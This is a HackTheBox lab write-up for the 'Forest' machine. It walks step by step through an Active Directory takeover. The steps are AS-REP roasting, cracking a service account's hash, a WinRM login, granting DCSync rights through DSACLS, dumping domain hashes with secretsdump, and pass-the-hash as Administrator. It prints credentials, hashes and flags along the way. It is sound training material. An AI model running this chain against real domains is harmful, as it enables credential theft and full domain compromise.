# Forest
Box IP **10.10.10.161**


### Nmap scan

`msf > db_nmap -sC -sV -T4 forest.htb`


### Services
```
53/tcp    open     domain
88/tcp    open     kerberos-sec   Microsoft Windows Kerberos (server time: 2020-02-29 20:23:29Z)
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
389/tcp   open     ldap           Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds   Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http     Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
646/tcp   filtered ldp
3268/tcp  open     ldap           Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3909/tcp  filtered surfcontrolcpa
5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7597/tcp  filtered qaz
9389/tcp  open     mc-nmf         .NET Message Framing
```


### Enumerate users

By running rpcclient we get a list of users
```
$ rpcclient -W htb.local -c querydispinfo -U '' -N forest.htb
```
- Administrator
- sebastien
- lucinda
- svc-alfresco
- andy
- mark
- santi


### AS-REP Roasting

By AS-REP Roasting Kerberos users we get **svc-alfresco**'s hash

```
$ python GetNPUsers.py -dc-ip 10.10.10.161 -no-pass -usersfile users.txt -format john htb.local/

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB.LOCAL:9947224373e83993d1d53fa912e857ab$c53ca04e34b7755ed64dd46f7431fb7009430a647eb67259223f76361e4a3e1fe38dc95fcaf953e4fd3624abc796b24c9f752adf77e39d25d3408f7e5653e6c3fb52207fa2a6148e0184a69732e92fd46fd9e402c9faacdafc419c656531a08d841454fe2a5e99d73e5aff3e7c9bef9662e926e4641b3726233ad7a83a58a876ba7c1db98781ca2a4b613fc594c5b101a1b22c24d27be80a77fe377e9488a9dc50bc937858d747ea3447165a5e6a95634eb3a592a6847ea93618cb300b4894a882508e1cada18800f101db3d117eda8b1e71f5574e91faf109da5346f64b8c4be2376e29b4aa
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

By cracking the hash with **john** we get the password **s3rvice**

```
$john -wordlist:/usr/share/wordlists/rockyou.txt hash.txt
```


### User Flag

We log in with evil-winrm and we get the first flag

```
$ evil-winrm -u svc-alfresco -p s3rvice -s /root/forest/ -i forest.htb
PS> type ..\Desktop\user.txt
517ad0ec2458ca97af8d93aac08a2f3c
```


### Bloodhound

We use **Bloodhound** to find the Shortest Paths to Domain Admins.
Path: Users belonging to the group **Exchange Windows Permissions** are allowed to modify the Discretionary Access Control List (DACL). With this write permission (WriteDacl), a user of that group can give himself or others any privileges, such as DCSync.


### Create new user

User svc-alfresco belongs to the group of **Account Operators**, so we can create a new user and add it to a group.
```
PS> whoami /all

# Create new user
PS> New-ADUser -Name <user> -SamAccountName <user> -Path "CN=Users,DC=htb,DC=local" -AccountPassword(ConvertTo-SecureString <pass> -AsPlainText -Force) -Enabled $true

# Add user to Exchange Windows Permission group
PS> Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members <user>

# Add user to Remote Management
PS> Add-ADGroupMember -Identity "Remote Management Users" -Members <user>
```


### Assign DCSync rights

We log in with the new user and we change the DACL

```
PS> $Identity = "htb.local\<user>"
PS> $RootDSE = [ADSI]"LDAP://RootDSE"
PS> $DefaultNamingContext = $RootDse.defaultNamingContext
PS> $UserPrincipal = New-Object Security.Principal.NTAccount("$Identity")
PS> DSACLS "$DefaultNamingContext" /G "$($UserPrincipal):CA;Replicating Directory Changes"
PS> DSACLS "$DefaultNamingContext" /G "$($UserPrincipal):CA;Replicating Directory Changes All"
```


### DCSync attack

By performing a DCSync attack with **secretsdump** we get the hashes of each user

```
$ python secretsdump.py htb.local/<user>:<pass>@10.10.10.161 > hashes.txt
```


### Root Flag

We log in as Administrator and we get the second flag

```
$ evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i forest.htb
PS> type ..\Desktop\root.txt
f048153f202bbb2f82622b04d79129cc
```


If you liked this write-up, please leave a respect on my hackthebox

![htbbadge](https://www.hackthebox.eu/badge/image/77747)
